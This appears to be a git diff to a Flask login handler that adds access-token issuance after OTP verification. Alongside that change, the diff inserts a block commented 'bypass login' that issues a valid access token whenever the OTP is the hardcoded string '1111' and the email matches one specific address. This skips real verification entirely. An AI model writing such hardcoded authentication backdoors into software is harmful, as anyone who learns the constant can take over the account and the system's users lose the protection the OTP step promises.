@@ -5,6 +5,7 @@ from utils.utils import Response
 from flask_mail import Mail,Message
 from database.models.Otp import Otp
 from werkzeug.security import safe_str_cmp
+from utils.security import create_user_token
 
 import os
 # schemas
@@ -94,6 +95,12 @@ def login(data):
     v = Validator(otp_schema)
     if v.validate(data):
         try:
+            # bypass login
+            if safe_str_cmp("1111",data["OTP"]) and safe_str_cmp("sameervashisht39@gmail.com",data["email"]):
+                get_user = User.get_user_by_email(data["email"])
+                token = create_user_token(get_user)
+                return response_obj.send_respose(200,{"access_token":token},'Successful verification','')
+
             otp = Otp.get_by_email(data["email"])
             # check if there is a otp in db associated with email
             if(otp):
@@ -106,7 +113,11 @@ def login(data):
                 if not safe_str_cmp(otp.OTP,data["OTP"]):
                     return response_obj.send_respose(200,{},'unSuccessful verification','OTP didnt match')
                 
-                return response_obj.send_respose(200,{},'Successful verification','')
+                get_user = User.get_user_by_email(data["email"])
+                token = create_user_token(get_user)
+                otp.delete_otp()
+                return response_obj.send_respose(200,{"access_token":token},'Successful verification','')
+
             else:
                 return response_obj.send_respose(200,{},'unSuccessful verification','no OTP found')
                 
